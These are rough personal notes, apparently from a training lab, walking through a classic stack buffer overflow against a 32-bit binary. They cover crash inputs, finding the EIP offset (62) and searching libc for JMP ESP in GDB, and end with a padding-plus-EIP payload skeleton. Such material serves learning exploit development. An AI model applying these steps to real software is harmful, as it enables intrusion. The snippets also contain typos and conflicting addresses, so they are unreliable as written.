https://wiremask.eu/tools/buffer-overflow-pattern-generator/
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!DEMO!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!



file func
    ELF 32 bit, dynamically linked
md5sum 
strings func
    look for things that stand out
#DYNAMIC ANALYSIS
      run it- ./func
        try interacting
#TRY TO CRASH IT
      python3 -c "print ('A'*200)" | ./func
      ./func <<< AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        "Segmentation fault (core dumped)"


      #!/usr/bin/python
        #GDB
      # General Buffer Overflow Process:
      #step 0: Perform reverse engineering/identfy vulnerability
      #step 1: find the bufer size/offset
      #step 2: Validate EIP Overwrite
      #ste[ 3: identify bad charackters to exclude from shellcode 
      #step 4: Find a valid JMP ESP (assembly instruction)
      #step 5:Generate shellcode and run exploit


#STEP 0!!!           
#Run Func in GDB
           
#disassemble main
           
#disass main
      disass main
#disass getuserinput
            disass getuserinput
               puts and gets
#pdisass getuserinput
           colorcodes vulnerability
#STEP 1!!! FIND BUFFER SIZE/OFSET
      #run <<< *enter string*
        look at registers
        look at ESP, trying to get to EIP
        grab memory address of EIP copy into website at top of this page to find the offset
#OFFSET IS 62
   #run <<<  $(python3 -c 'print("A" 8 62 + "B" * 4)')
           #AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
   #RUN GDB IN A CLEAN ENV
   # env - gdb ./func


#env - gdb ./func
#unset env - show env
#unset env LINES
#unset env COLUMNS

#Search for JMP ESP
#info proc map (inside gdb)

#libc mem range: 0xf7ddd000 0xf7af000
#JMP ESP = ffe4
#find /b 0xf7ddd000, 0xf7faf000,0xff, 0xe4



           
           buffer = "A" * 62
           EIP = "B" * 4

           pring(buffer + eip)
           




























           
